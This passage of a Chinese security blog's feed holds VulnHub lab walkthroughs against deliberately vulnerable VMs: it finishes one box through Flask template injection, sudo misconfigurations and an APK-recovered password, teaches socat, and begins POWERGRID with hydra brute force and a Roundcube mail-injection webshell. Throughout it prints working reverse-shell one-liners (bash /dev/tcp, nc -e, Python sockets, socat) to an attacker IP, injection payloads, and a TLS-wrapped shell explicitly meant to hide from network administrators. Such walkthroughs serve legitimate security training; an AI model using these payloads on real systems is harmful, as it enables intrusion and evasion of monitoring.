class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord\">−</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord\">￼</span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mclose\">]</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">2</span><span class=\"mord\">.</span><span class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">.</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">h</span><span class=\"mord\">4</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">0</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span></span></span></span>s?l333tt=100)</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1259.png\" width=\"520\" alt=\"Image\">\n<p>命令成功被执行，表示 SSTI 模板注入漏洞是存在的，如果不用浏览器进行渗透，用终端进行命令行访问的话需要编码及转义</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmVqc29uLmNvbS9lbmMvdXJsZW5jb2RlLw==\">https://www.bejson.com/enc/urlencode/</span> 上进行 url 编码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1260.png\" width=\"420\" alt=\"Image\">\n<p><code>curl http://192.168.31.17:5000/sh4d0w\\$s?l333tt=%7B%7B10*10%7D%7D</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1261.png\" width=\"470\" alt=\"Image\">\n<p>接下来就用这个模板的漏洞进行反弹 shell，先用最基础的试试<br>\n <code>&#123;% import os %&#125;&#123;&#123;os.system('bash -c \"bash -i >&/dev/tcp/192.168.31.99/4444 >&1\"')&#125;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1262.png\" width=\"520\" alt=\"Image\">\n<p>服务器返回了错误，得换其他的方式</p>\n<h3 id=\"ssti模板注入绕过\"><a class=\"markdownIt-Anchor\" href=\"#ssti模板注入绕过\">#</a> SSTI 模板注入绕过</h3>\n<p>用 url 编码尝试能否绕过</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1263.png\" width=\"620\" alt=\"Image\">\n<p>绕过失败，回显显示错误，shell 没有反弹出来，当然 curl 可能因为编码和转义的原因不太准确，不确定的话可以使用浏览器确认一下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1264.png\" width=\"700\" alt=\"Image\">\n<p>尝试用以下方式执行系统命令 (浏览器会默认对空格、引号等自动 url 编码，直接访问即可)：<br>\n <code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls -la').read()&#125;&#125;</code> <br>\n <code>http://192.168.31.17:5000/sh4d0w\\$s?l333tt=&#123;&#123;%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20-la%27).read()%20&#125;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1265.png\" width=\"660\" alt=\"Image\">\n<p>命令执行成功，返回了 ls -al 命令的信息，判断目标站点是否存在 nc、python、bash 等可反弹 shell 的命令</p>\n<p><code>http://192.168.31.17:5000/sh4d0w\\$s?l333tt=&#123;&#123;%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20-la%27).read()%20&#125;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1266.png\" width=\"660\" alt=\"Image\">\n<p>用 nc 来反弹 shell：<br>\n <code>http://192.168.31.17:5000/sh4d0w\\$s?&#123;&#123;%20config.__class__.__init__.__globals__[]%27os%27].popen(%27nc%20192.168.31.99%204444%20-e%20/bin/bash%27).read()%20&#125;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1267.png\" width=\"620\" alt=\"Image\">\n<p>拿到 webshell 之后就是对其进行输出一个标准的 shell，就不多说了</p>\n<h3 id=\"socat反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#socat反弹shell\">#</a> socat 反弹 shell</h3>\n<p>查看 sudo -l 时，看到可以无密码执行 kori 下的一个命令</p>\n<blockquote>\n<p>先无脑用 python 3 尝试一下能否反弹 shell 出来<br>\n <code>sudo -u kori /bin/php /home/kori/jail.php python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31. 99 &quot;,4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p>\n</blockquote>\n<p>反弹失败了，查看 /home/kori/jail.php 文件，发现在 jail.php 文件中基本上能反弹 shell 的命令都给过滤掉了，包括一些特殊字符都不能在使用，我们能否绕过这些过滤信息，一旦绕过过滤，我们所输入的命令就会被执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1268.png\" width=\"630\" alt=\"Image\">\n<blockquote>\n<p>发现服务器上是存在 socat 命令的，socat 可以算做是高级一点的 nc，并且反弹 shell 的时候只需要分号不需要其他的特殊符号的参与，后面详细介绍 socat 的使用方法，这里先把 shell 反弹出来<br>\n <code>nc - lvvp 3335</code> <br>\n <code>sudo -u kori /bin/php /home/kori/jail.php socat exec:'sh',pty,stderr,setsid,sigint,sane</code> <br>\n <code>tcp:192.168.31.99:4445</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1270.png\" width=\"700\" alt=\"Image\">\n<p>反弹后同样先获取一个标准的 tty，查看权限设置时看到了一条命令，可调用 irida 用户用 cp 命令将其用户目录下的 irida.apk 文件拷贝到 kori 下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1271.png\" width=\"560\" alt=\"Image\">\n<h3 id=\"权限设置错误\"><a class=\"markdownIt-Anchor\" href=\"#权限设置错误\">#</a> 权限设置错误</h3>\n<p>直接执行这条命令，看会有什么样的回显产生</p>\n<p><code>sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk</code> <br>\n 发现权限不允许，通过 chmod o+w . 给其他用户添加写权限，再次复制成功了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1272.png\" width=\"520\" alt=\"Image\">\n<p>查看此文件的权限时，发现还是属于 irida 用户，如果我们先用 kori 用户创建 irida.apk 的文件，再将 irida 用户目录下的 apk 文件复制过来，那么最后得到的文件的权限就会归属于 kori 用户<br>\n <code>rm - f irida.apk;touch irida.apk; chmod +777 irida.apk</code> <br>\n <code>sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1273.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"apk反编译\"><a class=\"markdownIt-Anchor\" href=\"#apk反编译\">#</a> apk 反编译</h3>\n<p>将 apk 发送到一台 windows 虚拟机或者主机上，尝试反编译<br>\n <code>scp irida.apk administrator@192.168.31.16:/E:/Desktop</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1274.png\" width=\"520\" alt=\"Image\">\n<p>在 github 上搜索得到 AndroidKiller 一款用来反编译 apk 的工具</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1275.png\" width=\"660\" alt=\"Image\">\n<p>用此工具打开 apk 文件即可自动的进行反编译</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1276.png\" width=\"660\" alt=\"Image\">\n<p>经过一段时间后，apk 被成功反编译为了 jar 文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1277.png\" width=\"660\" alt=\"Image\">\n<p>而 jar 文件是可以直接采用 IDEA 打开的，但是打开之后是不允许编辑的，可以借助 IDEA 工具对其源码进行审计，然后复制出关键的信息进行利用</p>\n<h3 id=\"idea反编译jar\"><a class=\"markdownIt-Anchor\" href=\"#idea反编译jar\">#</a> IDEA 反编译 jar</h3>\n<p>在 jar 文件中找到一个登陆数据，调用了一个方法，将该方法的输出结果作为登陆进去的密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1278.png\" width=\"660\" alt=\"Image\">\n<p>拉取这部分的代码，执行构造的代码，反向输出原有的密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1279.png\" width=\"660\" alt=\"Image\">\n<p>得到密码 eye.of.the.tiger (), 并且可依靠此密码登陆到 irida 用户下</p>\n<p>找到 irida 用户的一条用户权限设置错误，可调用 python3 <span class=\"exturl\" data-url=\"aHR0cDovL3huLS1vcmFzLXBrNmhnNDVxLnB5\">执行 oras.py</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1280.png\" width=\"520\" alt=\"Image\">\n<p>但是现在的问题是没有权限去查看 oras.py 到底有什么内容，只能根据执行后的回显结果进行猜测<br>\n <code>sudo /usr/bin/python3 /root/oras.py</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1281.png\" width=\"470\" alt=\"Image\">\n<p>需要输入一个参数，并且错误信息提示我们需要输入的是一个十六进制的数据</p>\n<h3 id=\"python输出hex\"><a class=\"markdownIt-Anchor\" href=\"#python输出hex\">#</a> python 输出 hex</h3>\n<blockquote>\n<p>用 python3 调用十六进制，将 whoami 编码为十六进制<br>\n python3 -c “print (b&quot;whoami”.hex ())&quot; | sudo python3 /root/oras.pyi<br>\npython3 -c 是在命令行执行 python 代码，上述命令表示用 python 3 在命令输出<br>\n一个 whoami 的十六进制数据并将这个数据作为后面那个脚本的输入，字符串中的’b’字符前缀使变量成为字节类型。</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1282.png\" width=\"570\" alt=\"Image\">\n<p>这里输了一些命令之后命令被挤掉了，说明 stty 设置的不够严谨，重新 reset 一下，stty 如何设置前面有介绍这里就直接利用</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1283.png\" width=\"620\" alt=\"Image\">\n<p>上述命令因为符号转义问题即括号的书写不规范导致命令错误，这里不确定自己的命令是否正确，就分为了两部执行，先打印出十六进制，运行后面的脚本，并把十六进制数据作为后者的输入，正常的写法为</p>\n<p><code>python3 -c &quot;print(b\\&quot;whoami\\&quot;.hex())&quot;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1284.png\" width=\"370\" alt=\"Image\">\n<p>将 whoami 的十六进制数据 77686f616d69 带入脚本中执行，看到报错代码内容为 exec（name），而 print (exec (‘whoami’)) 是错误的语法</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1285.png\" width=\"340\" alt=\"Image\">\n<h3 id=\"py-exec执行命令\"><a class=\"markdownIt-Anchor\" href=\"#py-exec执行命令\">#</a> py exec 执行命令</h3>\n<p>搜索 python 的 exec 如何执行，在下图的示例中，可见需要在 exec 中添加的内容为 print（‘Hello World’）的形式</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1286.png\" width=\"520\" alt=\"Image\">\n<p>同样先把 print (‘Hello World’) 转为为十六进制<br>\n <code>python3 -c &quot;print(b\\&quot;print('Hello World')\\&quot;.hex())&quot;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1287.png\" width=\"460\" alt=\"Image\">\n<p>将得到的数据 7072696e74282748656c6c6f20576f726c642729 带入到脚本中执行，执行成功，并且打印出来了 Hello World</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1288.png\" width=\"370\" alt=\"Image\">\n<p>通过 python 命令行引入 os 包，以 os 包下的 system 执行系统命令<br>\n <code>python3 -c &quot;print(b\\&quot;__import__('os').system('whoami')\\&quot;.hex())&quot;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1289.png\" width=\"580\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo python3 /root/oras.py</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">5f5f696d706f72745f5f28276f7327292e73797374656d282777686f616d692729</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1290.png\" width=\"480\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过nc将root的shell反弹出来</span></span><br><span class=\"line\">python3 -c &quot;print(b\\&quot;__import__(&#x27;os&#x27;).system(&#x27;nc -e /bin/bash 192.168.31.99 4446&#x27;)\\&quot;.hex())&quot; | sudo python3 /root/oras.py</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">5f5f696d706f72745f5f28276f7327292e73797374656d28276e63202d65202f62696e2f62617368203139322e3136382e33312e393920343434362729</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1291.png\" width=\"700\" alt=\"Image\">\n<p>-&gt; 最终拿到了 root 权限</p>\n<h3 id=\"socat通信\"><a class=\"markdownIt-Anchor\" href=\"#socat通信\">#</a> socat 通信</h3>\n<blockquote>\n<p>socat 功能灵活，除了完成 nc 能完成的所有任务外，还有很多实用的用法：<br>\n基本命令就是：socat [参数] &lt; 地址 1 &gt; &lt; 地址 2 &gt;<br>\n 使用 socat 需要提供两个地址，socat 会将这两个地址的数据流串起来，把第左边地址的输出数据传给右边，同时又把右边输出的数据传到左边。Socat 的主要特点就是在两个数据流之间建立通道，且支持众多协议和链接方式。如 IP、TCP、UDP、IPv6、PIPE、EXEC、System、Open、Proxy、Openssl、Socket 等。</p>\n</blockquote>\n<p><code>socat - - </code>  把标准输入和标准输出对接，输入什么显示什么<br>\n就会对接标准输入和标准输出，类似无参数的 cat 命令</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1292.png\" width=\"420\" alt=\"Image\">\n<p>网络测试 两台主机到底网络能否联通：<br>\n <code>socat - TCP-LISTEN:8080</code>  终端 1 上启动 server 监听 TCP<br>\n <code>socat - TCP:localhost:8080</code>  终端 2 上启动 client 链接 TCP</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1293.png\" width=\"380\" alt=\"Image\">\n<p>服务端在 TCP-LISTEN 地址后面加了 fork 的参数后，就能同时应答多个链接过来的客户端，每个客户端会 fork 一个进程出来进行通信，加上 reuseaddr 可以防止链接没断开玩无法监听的问题。<br>\n <code>socat - TCP-LISTEN:8080,fork,reuseaddr</code>  # 终端 1 上启动 server<br>\n <code>socat - TCP:localhost:8080</code>  # 终端 2 上启动 client</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1294.png\" width=\"510\" alt=\"Image\">\n<p>socat 也可以用 UDP 进行通信<br>\n <code>socat - UDP-LISTEN:8080</code>  # 终端 1 上启动 server 监听 UDP<br>\n <code>socat - UDP:localhost:8080</code>  # 终端 2 上启动 client 链接 UDP</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1295.png\" width=\"380\" alt=\"Image\">\n<h3 id=\"socat-端口转发\"><a class=\"markdownIt-Anchor\" href=\"#socat-端口转发\">#</a> socat 端口转发</h3>\n<p>在主机上监听 8080 端口，将 8080 端口所有流量转发给远程机器的 80 端口，同时在远程机器上开启一个 web 界面：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1296.png\" width=\"620\" alt=\"Image\">\n<p>使用以下命令，访问 127.0.0.1 的流量都转发到了 1.117.52.219 的 8080 上了<br>\n <code>socat TCP-LISTEN:8080,fork,reuseaddr TCP:1.117.52.219:80</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1297.png\" width=\"620\" alt=\"Image\">\n<p>socat 加上 fork 以后，每次 accept 一个链接都会 fork 出一份来不影响接收其他的新连接，这样 socat 就可以当一个端口转发服务，一直启动在那里。</p>\n<p>本地转发，在 80 端口起一个 python 的 http.server 服务<br>\n将 80 端口的服务转发至本地的 8888 端口<br>\n <code>socat TCP-LISTEN:8888,reuseaddr,fork TCP:127.0.0.1:80</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1298.png\" width=\"460\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-1299.png\" width=\"350\" alt=\"Image\">\n<p>日志信息输出<br>\n <code>socat -d -d tcp-listen:1234 -</code> <br>\n <code>socat -d -d tcp-connect:127.0.0.1:1234 -</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1594.png\" width=\"700\" alt=\"Image\">\n<p>前面两个连续的 -d -d 代表调试信息的输出级别。</p>\n<h3 id=\"socat-文件传输\"><a class=\"markdownIt-Anchor\" href=\"#socat-文件传输\">#</a> socat 文件传输</h3>\n<p>采用 FILE 协议将文件传输到另一台机器</p>\n<p><code>socat -d -d tcp-listen:1234 OPEN:filetransfer.txt,create</code> <br>\n <code>sudo socat -d -d tcp-connect:127.0.0.1:1234 FILE:/etc/passwd</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1300.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"socat-规避防火墙\"><a class=\"markdownIt-Anchor\" href=\"#socat-规避防火墙\">#</a> socat 规避防火墙</h3>\n<blockquote>\n<p>socat 的强大之一在于支持 openssl、可以用于 openssl 连接，这样获取到的反弹 shell 将对网络管理员造成很大的排查难度</p>\n</blockquote>\n<p>创建一个将用于加密连接的证书，我们可以为此使用自签名证书<br>\n <code>openssl req -newkey rsa: 2048 - nodes -keyout cert.key -x509 -days 1000 - out cert.crt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1301.png\" width=\"700\" alt=\"Image\">\n<p>这将会产生两个文件，cert.crt 和 cert.key，需要组合为 pem 文件<br>\n <code>cat cert.key cert.crt &gt; sslkey.pem</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1302.png\" width=\"450\" alt=\"Image\">\n<blockquote>\n<p>现在我们就得到了一个可以用来连接 socat 加密的证书<br>\n当我们使用加密证书的时候，就不再用 tcp 监听链接，而是用的 openssl 监听，<br>\n 因为没有使用有效证书需要添加 verify 标志禁用连接端的证书链校验<br>\n <code>socat -d -d openssl-listen:1234,cert=sslkey.pem,verify=0 -</code> <br>\n <code>socat -d -d openssl-connect:127.0.0.1: 1234 ,verify=0 exec:/bin/bash</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1303.png\" width=\"700\" alt=\"Image\">\n<p>这是一个无法或者很难被网络管理员监控的加密链接，这使得网络管理员更难分析我们的数据</p>\n<h3 id=\"socat-远程登录\"><a class=\"markdownIt-Anchor\" href=\"#socat-远程登录\">#</a> socat 远程登录</h3>\n<p>一个重要的地址类型就是 EXEC 可以执行程序并且把输入输出和另外一个地址串起来，比如服务端：<br>\n <code>socat -d -d TCP-LISTEN:8080,fork,reuseaddr EXEC:/bin/bash</code> <br>\n <code>socat -d -d - TCP:localhost:8080</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1595.png\" width=\"660\" alt=\"Image\">\n<blockquote>\n<p>完善一点可以加些参数：(正)<br>\nsocat -d -d TCP-LISTEN:8080,fork,reuseaddr EXEC:/bin/bash,pty,stderr<br>\nsocat -d -d file: <code>tty</code> ,raw,echo=0 TCP:localhost:8080</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1304.png\" width=\"620\" alt=\"Image\">\n<blockquote>\n<p>也可以用如下的参数：（反）<br>\nsocat -d -d exec:‘bash -li’,pty,stderr,setsid,sigint,sane TCP:192.168.0.149:8080<br>\nsocat -d -d file: <code>tty</code> ,raw,echo=0 TCP-LISTEN:8080</p>\n</blockquote>\n<blockquote>\n<p>这样可以把 bash 的标准错误重定向给标准输出，并且用终端模式运行。客户端可以像刚才那样登录，但是还可以更高级点，用 tty 的方式访问，这样基本就得到了一个全功能的交互式终端了，可以在里面运行 vim, emacs 之类的程序。</p>\n</blockquote>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/150%20POWERGRID/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/150%20POWERGRID/",
            "title": "VULNHUB 50 POWERGRID",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcG93ZXJncmlkLTEwMSw0ODUv\">https://www.vulnhub.com/entry/powergrid-101,485/</span><br>\n 教程链接地址 1: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pvbmFoX0JhcmUvYXJ0aWNsZS9kZXRhaWxzLzEwNjk2MTQ3Nw==\">https://blog.csdn.net/Jonah_Bare/article/details/106961477</span><br>\n 教程链接地址 2: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL3Bvd2VyZ3JpZC0xLTAtMS12dWxuaHViLXdhbGt0aHJvdWdoLw==\">https://www.hackingarticles.in/powergrid-1-0-1-vulnhub-walkthrough/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 POWERGRID：桥接于 192.168.0.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1554.png\" width=\"520\" alt=\"Image\">\n<p><code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs sudo nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1555.png\" width=\"620\" alt=\"Image\">\n<p><code>sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.1 90 --min-rate=5000</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1556.png\" width=\"660\" alt=\"Image\">\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xOTAv\">http://192.168.0.190/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1557.png\" width=\"620\" alt=\"Image\">\n<p>收集到了三个用户名 deez 1 、p48 和 all 2</p>\n<p>用 common.txt 字典扫了一波，没有扫到有价值的信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1558.png\" width=\"660\" alt=\"Image\">\n<p>换了个字典扫了一波，扫到了一个 zmail 的目录</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1559.png\" width=\"660\" alt=\"Image\">\n<p>访问之后得到了一个登陆页面</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xOTAvem1haWw=\">http://192.168.0.190/zmail</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1560.png\" width=\"620\" alt=\"Image\">\n<p>由于已经有了三个用户名了，是有机会爆破得到密码的</p>\n<h3 id=\"hydra爆破http-get\"><a class=\"markdownIt-Anchor\" href=\"#hydra爆破http-get\">#</a> hydra 爆破 http-get</h3>\n<p>选择模式为 http-get，选取密码为 rockyou.txt 开始爆破<br>\n <code>hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.0.190 -f http-get /zmail/ -t 64 -f -vV -o hydra.ssh</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1561.png\" width=\"660\" alt=\"Image\">\n<p>第一个用户爆破了 18 万次了还是没有爆破成功，等的有点着急，让这个继续爆破下起，同时在启一个 terminal 跑另外一个爆破选择第二个用户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1562.png\" width=\"660\" alt=\"Image\">\n<p><code>hydra -l p48 -P /usr/share/wordlists/rockyou.txt 192.168.0.190 - f http-get /zmail/ -t 64 -f -vV -o hydra.ssh</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1563.png\" width=\"660\" alt=\"Image\">\n<p>在爆破到 12 万次的时候，得到了 p48 的密码 electrico</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1564.png\" width=\"620\" alt=\"Image\">\n<p>一个后台登陆地址，再次用 p48:electrico 登陆到其中成功</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1565.png\" width=\"620\" alt=\"Image\">\n<p>登陆成功，得到一个邮箱的后台界面</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1566.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"roundcube-邮件系统\"><a class=\"markdownIt-Anchor\" href=\"#roundcube-邮件系统\">#</a> roundcube 邮件系统</h3>\n<p>有一封邮件，看起来比较重要，看一下什么意思</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1567.png\" width=\"660\" alt=\"Image\">\n<p>就是有一个 gpg 加密后的 ssh 私钥文件，解开此私钥文件即可登陆 p 48</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1568.png\" width=\"660\" alt=\"Image\">\n<p>找了一圈没有找到 roundcude 的版本，直接用 searchsploit 搜索一波</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1569.png\" width=\"660\" alt=\"Image\">\n<p>将此 RCE 漏洞说明文件复制到本地，开始阅读，尝试测试能否突破</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1570.png\" width=\"470\" alt=\"Image\">\n<blockquote>\n<p>阅读后发现需要将 from 改为 example@example.com -OQueueDirectory=/tmp -X/var/www/html/rce.php，从_subject 参数中获取到 rce.php 脚本的内容</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1571.png\" width=\"520\" alt=\"Image\">\n<p>在后台中开是发送邮件，并且把数据拦截到 burp, 利用 burp 抓包，可以看到原始数据包有很多参数</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1572.png\" width=\"520\" alt=\"Image\">\n<blockquote>\n<p>伪造参数内容如下，其中 token 需要和自己抓到的数据的 token 一致<br>\n<span class=\"exturl\" data-url=\"bWFpbHRvOl90b2tlbj1rcnBKOWhMSGFic1lFQUdzUzk4aXBJVkxSQmZ3SFh3VSZhbXA7X3Rhc2s9bWFpbCZhbXA7X2FjdGlvbj1zZW5kJmFtcDtfaWQ9MTEzMTU0ODgwMDYyZjcwYzVhOTBlMTYmYW1wO19hdHRhY2htZW50cz0mYW1wO19mcm9tPWV4YW1wbGVAZXhhbXBsZS5jb20=\">_token=krpJ9hLHabsYEAGsS98ipIVLRBfwHXwU&amp;_task=mail&amp;_action=send&amp;_id=113154880062f70c5a90e16&amp;_attachments=&amp;_from=example@example.com</span> -OQueueDirectory=/tmp -X/var/www/html/rce.php&amp;_to=sssssss%<span class=\"exturl\" data-url=\"aHR0cDovLzQwcXEuY29t\">40qq.com</span>&amp;_cc=&amp;_bcc=&amp;_replyto=&amp;_followupto=&amp;_subject=<?php phpinfo();?>&amp;editorSelector=plain&amp;_priority=0&amp;_store_target=Sent&amp;_draft_saveid=&amp;_draft=&amp;_is_html=0&amp;_framed=1&amp;_message=aaa</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1573.png\" width=\"520\" alt=\"Image\">\n<p>页面访问发现没有看到 rce.php 的代码，但是不是 not found 的提示，说明我们已经成功的上传上去了一个后门</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1574.png\" width=\"420\" alt=\"Image\">\n<h3 id=\"shell转移到antsword\"><a class=\"markdownIt-Anchor\" href=\"#shell转移到antsword\">#</a> shell 转移到 antsword</h3>\n<p>其他没有任何信息的页面应该是如下内容</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1575.png\" width=\"380\" alt=\"Image\">\n<p>这次直接写一个 post 的一句话后门，可用 antsword 连接</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1576.png\" width=\"580\" alt=\"Image\">\n<p>连接成功后门，可以继续往此后门中写入反弹 shell 的代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1577.png\" width=\"620\" 